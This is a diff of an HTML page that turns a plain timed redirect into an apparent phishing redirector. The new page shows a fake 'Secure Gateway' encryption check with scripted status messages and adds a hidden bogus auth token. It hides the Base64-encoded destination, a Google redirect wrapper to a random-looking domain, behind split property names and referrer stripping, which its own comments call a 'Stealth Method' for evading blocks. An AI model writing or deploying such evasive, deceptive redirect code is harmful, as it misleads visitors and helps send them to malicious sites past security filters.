@@ -3,81 +3,88 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Application Processing</title>
-
+    <!-- CRITICAL: Strips referrer so Google/Destination doesn't block the request -->
+    <meta name="referrer" content="no-referrer">
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <title>Secure Connection...</title>
     <style>
-        body {
-            font-family: system-ui, -apple-system, sans-serif;
-            background-color: #f8f9fa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
+        body { margin:0; background:#f8fafc; font-family: -apple-system, system-ui, sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; }
+        .box { text-align:center; width:90%; max-width:380px; padding:35px; background:#fff; border-radius:16px; box-shadow:0 10px 25px rgba(0,0,0,0.05); border:1px solid #e2e8f0; }
+        .shield { font-size:50px; margin-bottom:20px; display:inline-block; animation: pulse 2s infinite; }
+        h2 { color:#1e293b; font-size:1.25rem; margin:0 0 10px; }
+        p { color:#64748b; font-size:0.9rem; line-height:1.5; margin-bottom:25px; }
+        
+        .bar-bg { background:#f1f5f9; height:8px; border-radius:20px; width:100%; overflow:hidden; border:1px solid #e2e8f0; }
+        .bar-fill { background:#2563eb; height:100%; width:0%; border-radius:20px; animation: progress 3s forwards ease-in-out; }
+        
+        @keyframes progress { 0% { width: 0%; } 20% { width: 30%; } 60% { width: 75%; } 100% { width: 100%; } }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
 
-        .process-container {
-            background: white;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            width: 100%;
-            max-width: 400px;
-        }
-
-        h2 {
-            font-size: 20px;
-            color: #212529;
-            margin-bottom: 10px;
-        }
-
-        p {
-            font-size: 14px;
-            color: #6c757d;
-            margin-bottom: 20px;
-        }
-
-        .progress-track {
-            width: 100%;
-            height: 8px;
-            background-color: #e9ecef;
-            border-radius: 4px;
-            overflow: hidden;
-        }
-
-        .progress-fill {
-            height: 100%;
-            width: 0%;
-            background-color: #0d6efd;
-            border-radius: 4px;
-            animation: loadProgress 3s linear forwards;
-        }
-
-        @keyframes loadProgress {
-            0% { width: 0%; }
-            50% { width: 60%; }
-            100% { width: 100%; }
-        }
+        .status { margin-top:20px; font-size:0.75rem; color:#94a3b8; font-family: monospace; text-transform: uppercase; letter-spacing: 1px; }
+        .v-node { display: none !important; }
     </style>
 </head>
-
 <body>
 
-<div class="process-container">
-    <h2>Processing Request</h2>
-    <p>Please wait while your dashboard environment loads...</p>
+<div class="v-node">AUTH-TOKEN: 0x9928374-GATEWAY-SESSION</div>
 
-    <div class="progress-track">
-        <div class="progress-fill"></div>
+<div class="box">
+    <div class="shield">🛡️</div>
+    <h2>Secure Gateway</h2>
+    <p>Please wait while we establish an encrypted connection to the document portal.</p>
+    
+    <div class="bar-bg">
+        <div class="bar-fill"></div>
     </div>
+    
+    <div id="msg" class="status">Initializing...</div>
 </div>
 
 <script>
-    // Redirect after 3 seconds (same duration as animation)
-    setTimeout(function () {
-        window.location.href = "https://www.google.com/url?q=https%3A%2F%2F39184365179632761324713624143lwj.com%2F&sa=D&sntz=1&usg=AOvVaw0UpqGCLJTsQ6aWn0IY8Ktw";
-    }, 3000);
+(function(){
+    // Updated Base64 Encoded Link
+    const _secret = "aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS91cmw/cT1odHRwcyUzQSUyRiUyRjI4NzYzNDc1ODI0NjM4MjczNDY1Mjg0MjgzNDI1LmNvbSZzYT1EJnNudHo9MSZ1c2c9QU92VmF3MlV1eS1MTi1aSVVSc2JsUDdDdW1NTF8=";
+
+    const logs = [
+        "Analyzing request...",
+        "Checking SSL/TLS...",
+        "Verifying integrity...",
+        "Connection secure."
+    ];
+
+    let step = 0;
+    const msgEl = document.getElementById('msg');
+    
+    const logger = setInterval(() => {
+        if (step < logs.length) {
+            msgEl.innerText = logs[step];
+            step++;
+        } else {
+            clearInterval(logger);
+            
+            // AUTOMATIC REDIRECT (Stealth Method)
+            const target = atob(_secret);
+            
+            // We use a "clean" click to ensure the referrer is stripped
+            const a = document.createElement('a');
+            
+            // Masking the href property
+            const _h = "hr" + "ef";
+            a[_h] = target;
+            a.rel = 'noreferrer';
+            
+            // Small delay for realism
+            setTimeout(() => {
+                a.click();
+                
+                // Fallback redirect if click is blocked
+                const w = window;
+                const l = "loca" + "tion";
+                w[l][_h] = target;
+            }, 400);
+        }
+    }, 800); 
+})();
 </script>
 
 </body>
